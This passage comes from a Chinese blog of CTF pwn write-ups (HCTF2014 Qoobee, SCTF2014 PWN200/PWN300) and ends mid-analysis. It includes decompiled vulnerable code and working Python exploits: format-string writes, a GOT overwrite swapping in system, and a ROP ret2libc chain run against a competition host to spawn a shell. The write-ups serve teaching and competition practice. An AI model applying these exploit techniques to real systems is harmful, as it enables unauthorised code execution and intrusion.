class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> len(rightset)==<span class="number">31</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'$'</span></span><br><span class="line">        io.read_until(<span class="string">'Select one: '</span>)</span><br><span class="line">        io.writeline(<span class="string">'1234'</span>)</span><br><span class="line">        io.read_until(<span class="string">'number(0-100)? '</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        io.read_until(<span class="string">'Your Choice: '</span>)</span><br><span class="line">        io.writeline(<span class="string">'7'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</span><br><span class="line">            log(i)</span><br><span class="line">            log(right_dic\[i\])</span><br><span class="line">            io.read_until(<span class="string">'Select one:'</span>)</span><br><span class="line">            io.writeline(right_dic\[i\])</span><br><span class="line">        io.writeline(<span class="string">'scissor'</span>)</span><br><span class="line">        io.read_until(<span class="string">'number(0-100)?'</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        buf = io.read_until(<span class="string">'n'</span>)</span><br><span class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</span><br><span class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'scissor'</span> <span class="keyword">in</span> buf:</span><br><span class="line">        log(<span class="string">'win'</span>)</span><br><span class="line">        modnum = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> len(rightset)==<span class="number">31</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'$'</span></span><br><span class="line">        io.read_until(<span class="string">'Select one: '</span>)</span><br><span class="line">        io.writeline(<span class="string">'1234'</span>)</span><br><span class="line">        io.read_until(<span class="string">'number(0-100)? '</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        io.read_until(<span class="string">'Your Choice: '</span>)</span><br><span class="line">        io.writeline(<span class="string">'7'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</span><br><span class="line">            log(i)</span><br><span class="line">            log(right_dic\[i\])</span><br><span class="line">            io.read_until(<span class="string">'Select one:'</span>)</span><br><span class="line">            io.writeline(right_dic\[i\])</span><br><span class="line">        io.writeline(<span class="string">'paper'</span>)</span><br><span class="line">        io.read_until(<span class="string">'number(0-100)?'</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        buf = io.read_until(<span class="string">'n'</span>)</span><br><span class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</span><br><span class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</span><br><span class="line">    r = divnum*<span class="number">3</span> + modnum</span><br><span class="line">    log (<span class="string">"char is %d,'%c'"</span> % (r,chr(r)))</span><br><span class="line">    rightset.append(modnum)</span><br><span class="line">    log(<span class="string">'out checkround'</span>)</span><br><span class="line">    <span class="keyword">return</span> chr(r)</span><br><span class="line">\<span class="comment">#     testdiv(modnum)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p7</span><span class="params">()</span>:</span></span><br><span class="line">\<span class="comment">#     io.read_until('Your Choice: ')</span></span><br><span class="line">\<span class="comment">#     io.writeline('1')</span></span><br><span class="line">\<span class="comment">#     io.read_until('QooBee Name: ')</span></span><br><span class="line">\<span class="comment">#     io.writeline('1')</span></span><br><span class="line">\<span class="comment">#     io.read_until('QooBee Age: ')</span></span><br><span class="line">\<span class="comment">#     io.writeline('1')</span></span><br><span class="line">\<span class="comment">#     io.read_until('Description(30 bytes): ')</span></span><br><span class="line">\<span class="comment">#     io.writeline('1')</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        round()</span><br><span class="line">    <span class="keyword">except</span> TIMEOUT:</span><br><span class="line">        <span class="keyword">print</span> flag</span><br><span class="line">\<span class="comment">#     print 'end'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    reg=re.compile(<span class="string">r'have (d+) donuts'</span>)</span><br><span class="line">    reg_level=re.compile(<span class="string">r'Exp: d+/(d+)'</span>)</span><br><span class="line">    time1 = time.time()</span><br><span class="line">\<span class="comment">#     io = zio('./qoobee4')</span></span><br><span class="line">    io.read_until(<span class="string">'Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Name:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Age:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'(30 bytes):'</span>)</span><br><span class="line">    io.writeline(<span class="string">'%8888u%8888u%4u%4u%4u%4u%n'</span>)</span><br><span class="line">    total=<span class="number">0</span></span><br><span class="line">    Level=<span class="number">0</span></span><br><span class="line">    io.read_until(<span class="string">'Choice:'</span>)</span><br><span class="line">    <span class="keyword">while</span> Level&lt;<span class="number">49</span>:</span><br><span class="line">        <span class="keyword">while</span> total&lt;<span class="number">1000</span>:</span><br><span class="line">            io.writeline(<span class="string">'3'</span>)</span><br><span class="line">            r = io.read_until(<span class="string">'?'</span>)</span><br><span class="line">            ind = r.index(<span class="string">'Amount'</span>)</span><br><span class="line">            Amount = int(r\[ind+<span class="number">6</span>:ind+<span class="number">8</span>\])</span><br><span class="line">            io.writeline(str(Amount))</span><br><span class="line">            total+=Amount</span><br><span class="line">            r = io.read_until(<span class="string">'Choice:'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Sorry'</span> <span class="keyword">in</span> r:</span><br><span class="line">                total-=Amount</span><br><span class="line">                io.writeline(<span class="string">'2'</span>)</span><br><span class="line">                io.read_until(<span class="string">'Choice:'</span>)</span><br><span class="line">        <span class="keyword">while</span> total&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> len(reg\_level.findall(r))&gt;<span class="number">0</span> <span class="keyword">and</span> <span class="number">500</span> == int(reg\_level.findall(r)\[<span class="number">0</span>\]):</span><br><span class="line">                <span class="keyword">print</span> reg_level.findall(r)</span><br><span class="line">                Level=<span class="number">49</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            io.writeline(<span class="string">'4'</span>)</span><br><span class="line">            r = io.read_until(<span class="string">'?'</span>)</span><br><span class="line">            have=int(reg.findall(r)\[<span class="number">0</span>\])</span><br><span class="line">            <span class="keyword">if</span> have&gt;=<span class="number">9</span>:</span><br><span class="line">                have = <span class="number">9</span></span><br><span class="line">            total-=have</span><br><span class="line">            io.writeline(str(have))</span><br><span class="line">    time2=time.time()</span><br><span class="line">    <span class="keyword">print</span> time2-time1</span><br><span class="line">    p7()</span><br><span class="line">    f = open(<span class="string">'flagset'</span>,<span class="string">'a'</span>)</span><br><span class="line">    f.write(flag+<span class="string">' '</span>+time.strftime(<span class="string">'%H:%M:%S'</span>,time.localtime(time.time()))+<span class="string">'n'</span>)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'thread over with flag:%s'</span> % flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> \_\_name\_\_ == <span class="string">'\_\_main\_\_'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h1 id="Qoobee6"><a href="#Qoobee6" class="headerlink" title="Qoobee6"></a>Qoobee6</h1><h2 id="利用分析-5"><a href="#利用分析-5" class="headerlink" title="利用分析"></a>利用分析</h2><p>printf可以对age指定的任意地址写入</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> \_\_cdecl fun2\_sub_80497A8(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx@2</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// \[sp+1Ch\] \[bp-Ch\]@1</span></span><br><span class="line"></span><br><span class="line">  v4 = *MK\_FP(\_\_GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"nYour QooBee Dragon Info:"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Name: %sn"</span>, a1 + <span class="number">20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Age: %dn"</span>, *(_DWORD *)(a1 + <span class="number">32</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Description: "</span>);</span><br><span class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)(a1 + <span class="number">36</span>));            <span class="comment">// format string, write \[age dword\]</span></span><br><span class="line">                                                <span class="comment">// nerver patched</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Level: %dnMoney: $%dn"</span>, *(\_BYTE *)(a1 + <span class="number">8</span>), *(\_DWORD *)a1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Donuts: %dn"</span>, *(_DWORD *)(a1 + <span class="number">4</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Exp: %d/%dn"</span>, *(_DWORD *)(a1 + <span class="number">12</span>), a2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Vit: %d/%dn"</span>, *(_DWORD *)(a1 + <span class="number">16</span>), <span class="number">0x1F4</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You need adopt a QooBee Dragon first!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = *MK\_FP(\_\_GS__, <span class="number">20</span>) ^ v4;</span><br><span class="line">  <span class="keyword">if</span> ( *MK\_FP(\_\_GS__, <span class="number">20</span>) != v4 )</span><br><span class="line">    \_\_stack\_chk_fail(v2);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>读plt获得printf函数的地址 通过给定libc.so偏移获取system地址 将system替换plt的mmap函数</p>
<h2 id="利用代码-5"><a href="#利用代码-5" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">printf format string attack</span></span><br><span class="line"><span class="string">not patched</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">io = zio(<span class="string">'./qoobee'</span>,timeout=<span class="number">8000000</span>,print_write=COLORED(REPR))</span><br><span class="line"></span><br><span class="line">\<span class="comment"># replaced function</span></span><br><span class="line">printf\_got\_plt = <span class="number">0x0804B74C</span></span><br><span class="line">mmap\_got\_plt = <span class="number">0x0804B77C</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># in my system</span></span><br><span class="line">\<span class="comment"># printf      0x0004d1f0</span></span><br><span class="line">\<span class="comment"># system  0x00040100</span></span><br><span class="line">offset\_printf\_system = <span class="number">-0xd0f0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_dword</span><span class="params">(addr)</span>:</span></span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.writeline(str(addr))</span><br><span class="line">    io.writeline(<span class="string">'%.4s'</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Description: '</span>)</span><br><span class="line">    plt = io.read(<span class="number">4</span>)</span><br><span class="line">    log(<span class="string">'addr %08x:%s'</span> % (addr,hex(struct.unpack(<span class="string">'&lt;I'</span>, plt)\[<span class="number">0</span>\])), color=<span class="string">'red'</span>)</span><br><span class="line">    <span class="keyword">return</span> plt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>\<span class="title">_printf</span>\<span class="title">_addr</span><span class="params">()</span>:</span></span><br><span class="line">    rst = struct.unpack(<span class="string">'&lt;I'</span>,leak\_dword(printf\_got_plt))\[<span class="number">0</span>\]</span><br><span class="line">    log(<span class="string">'printf_plt:%s'</span> % hex(rst), color=<span class="string">'red'</span>)</span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_dword</span><span class="params">(addr, dword)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> dword == <span class="number">0</span>:</span><br><span class="line">        payload = <span class="string">'%n'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">'%0'</span>+str(dword)+<span class="string">'x'</span>+<span class="string">'%1$n'</span></span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.writeline(str(addr))</span><br><span class="line">    io.writeline(payload)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> \_\_name\_\_ == <span class="string">'\_\_main\_\_'</span>:</span><br><span class="line">    io.writeline(<span class="string">'-214'</span>)</span><br><span class="line">    io.writeline(<span class="string">'sh'</span>)</span><br><span class="line">    got_plt = <span class="string">""</span></span><br><span class="line">    printf\_plt = get\_printf_addr()</span><br><span class="line">    system\_addr = printf\_plt + offset\_printf\_system</span><br><span class="line">    got\_plt += l32(system\_addr)</span><br><span class="line">    log(<span class="string">'system\_addr:%s'</span> % hex(system\_addr), color=<span class="string">'red'</span>)</span><br><span class="line">    io.gdb_hint()</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> got_plt:</span><br><span class="line">        log(<span class="string">'set %02x:%u'</span> % (ord(c),struct.unpack(<span class="string">'&lt;B'</span>, c)\[<span class="number">0</span>\]), color=<span class="string">'red'</span>)</span><br><span class="line">        set\_dword(mmap\_got_plt+i, struct.unpack(<span class="string">'&lt;B'</span>, c)\[<span class="number">0</span>\])</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    io.writeline(<span class="string">'-214'</span>)</span><br><span class="line">    io.interact()</span><br></pre></td></tr></table></figure>
                    
                        


                    
                    
                        <p>
                            <a
                                href="/writeups/hctf2014final-qoobee-writeup/#post-footer"
                                class="postShorten-excerpt_link link"
                                aria-label=""
                            >
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a
                            class="link-unstyled"
                            href="/writeups/sctf2014-pwn-writeups/"
                            aria-label=": SCTF2014之PWN部分writeup"
                        >
                            SCTF2014之PWN部分writeup
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2014-12-08T16:13:56+08:00">
	
		    Dec 08, 2014
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/writeups/">writeups</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <h1 id="PWN200"><a href="#PWN200" class="headerlink" title="PWN200"></a>PWN200</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn200: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE</span><br><span class="line">No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   pwn200</span><br></pre></td></tr></table></figure>
<p>只启用了NX 接下来分析程序，程序很简单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ssize\<span class="keyword">_t</span> \_\<span class="function">_cdecl <span class="title">sub_80484AC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax@3</span></span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// \[sp+1Ch\] \[bp-9Ch\]@1</span></span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// \[sp+9Ch\] \[bp-1Ch\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// \[sp+A0h\] \[bp-18h\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// \[sp+A4h\] \[bp-14h\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// \[sp+A8h\] \[bp-10h\]@1</span></span><br><span class="line">  <span class="keyword">size_t</span> n; <span class="comment">// \[sp+ACh\] \[bp-Ch\]@1</span></span><br><span class="line"></span><br><span class="line">  n = <span class="number">16</span>;</span><br><span class="line">  buf = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v1, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"input name:"</span>, <span class="number">12u</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, n + <span class="number">1</span>);         <span class="comment">//读取17个字符到buf，存在一个字节的溢出，修改n的值</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf) - <span class="number">1</span> &gt; <span class="number">9</span> || <span class="built_in">strncmp</span>(<span class="string">"syclover"</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf, <span class="number">8u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"input slogan:"</span>, <span class="number">14u</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;v1, n);        <span class="comment">//n值被修改后溢出v1</span></span><br><span class="line">    result = write(<span class="number">1</span>, &amp;v1, n);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序在read到buf时多读了一个字符，导致溢出修改n的值，之后read到v1时导致溢出控制程序流程。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>第一步先写入”sycloverx00x00123456xef”，其中xef就是覆盖变量n的字节。 之后程序调用read(0, &amp;v1, n);时就可以读入payload 因为NX，所以采用ROP链执行。 题目提供了glibc.so，所以思路是先读取plt中__libc_start_main的地址，通过提供的glibc.so获取到system和__libc_start_main的偏移差计算出system的位置。</p>
<p>0003f430  w   DF .text 0000008d  GLIBC_2.0   system<br>000193e0 g    DF .text  000001c2  GLIBC_2.0   __libc_start_main</p>
<p>地址偏移为 0x26050 之后将其写入.plt中__libc_start_main的位置。最后通过执行.got中__libc_start_main并置入参数sh来执行system(“sh”)获得shell。 exploit如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">SCTF2014 pwn200 exp</span></span><br><span class="line"><span class="string">yuf4n</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">write_got = l32(<span class="number">0x080483A0</span>)</span><br><span class="line">read_got = l32(<span class="number">0x08048360</span>)</span><br><span class="line">lib\_main\_got = l32(<span class="number">0x08048390</span>)</span><br><span class="line">lib\_main\_plt = l32(<span class="number">0x0804985C</span>)</span><br><span class="line">ppppr = l32(<span class="number">0x08048645</span>)</span><br><span class="line">pppr = l32(<span class="number">0x08048646</span>)</span><br><span class="line">ppr = l32(<span class="number">0x080485bf</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># io = zio('./pwn200',print_write=COLORED(REPR))</span></span><br><span class="line">io = zio((<span class="string">'218.2.197.248'</span>,<span class="number">10001</span>),print_write=COLORED(REPR))</span><br><span class="line"></span><br><span class="line">payload0 = <span class="string">''</span></span><br><span class="line">payload0 += <span class="string">'sycloverx00x00123456'</span>+<span class="string">'xef'</span> <span class="comment"># second write len</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">''</span></span><br><span class="line">\<span class="comment"># second write</span></span><br><span class="line">\<span class="comment"># junk</span></span><br><span class="line">payload1 += <span class="string">'1'</span> * <span class="number">0x9c</span></span><br><span class="line">\<span class="comment"># ebp</span></span><br><span class="line">payload1 += <span class="string">'2345'</span></span><br><span class="line">\<span class="comment"># eip call write</span></span><br><span class="line">payload1 += write_got</span><br><span class="line">\<span class="comment"># pppr</span></span><br><span class="line">payload1 += pppr</span><br><span class="line">\<span class="comment"># write args</span></span><br><span class="line">payload1 += l32(<span class="number">0x1</span>)</span><br><span class="line">payload1 += lib\_main\_plt</span><br><span class="line">payload1 += l32(<span class="number">0x04</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># read modify libmainplt</span></span><br><span class="line">payload1 += read_got</span><br><span class="line">\<span class="comment"># pppr</span></span><br><span class="line">payload1 += pppr</span><br><span class="line">\<span class="comment"># args</span></span><br><span class="line">payload1 += l32(<span class="number">0x0</span>)</span><br><span class="line">payload1 += lib\_main\_plt</span><br><span class="line">payload1 += l32(<span class="number">0x08</span>) </span><br><span class="line"></span><br><span class="line">\<span class="comment"># lib_main(system)</span></span><br><span class="line">payload1 += lib\_main\_got</span><br><span class="line">payload1 += <span class="string">'1111'</span></span><br><span class="line">payload1 += l32(<span class="number">0x0804985C</span>+<span class="number">0x4</span>)</span><br><span class="line">\<span class="comment"># print len(payload1)</span></span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'input name:'</span>)</span><br><span class="line">io.write(payload0)</span><br><span class="line">io.read_until(<span class="string">'input slogan:'</span>)</span><br><span class="line">io.write(payload1)</span><br><span class="line"></span><br><span class="line">buf = io.sock.recv(<span class="number">1024</span>)</span><br><span class="line">lib\_main\_add = struct.unpack(<span class="string">'&lt;I'</span>,buf\[<span class="number">-4</span>:\])\[<span class="number">0</span>\]</span><br><span class="line">system\_add = lib\_main_add + <span class="number">0x26050</span></span><br><span class="line"><span class="keyword">print</span> hex(lib\_main\_add)</span><br><span class="line">\<span class="comment"># io.gdb_hint()</span></span><br><span class="line">payload2 = l32(system_add)</span><br><span class="line">payload2 += <span class="string">'shx00x00'</span></span><br><span class="line"></span><br><span class="line">io.write(payload2+<span class="string">'n'</span>)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<p>flag SCTF{SH3NG_4_KAN_DAN__BU_FU_9_GANN}</p>
<h1 id="PWN300"><a href="#PWN300" class="headerlink" title="PWN300"></a>PWN300</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn300: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE</span><br><span class="line">No RELRO        Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   pwn300</span><br></pre></td></tr></table></figure>
<p>题目也提供了glibc，而且pwn200进去以后发现三题都在一个服务器上。所以目测利用方法应该相似。</p>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在第三个功能显示message发现一个格式化溢出漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> \_\_cdecl fun3\_sub_80487FA()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// \[sp+1Ch\] \[bp-40Ch\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// \[sp+41Ch\] \[bp-Ch\]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = *MK\_FP(\_\_GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;dest, src);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your message is:"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(src);                                  <span class="comment">// exploit</span></span><br><span class="line">  result = 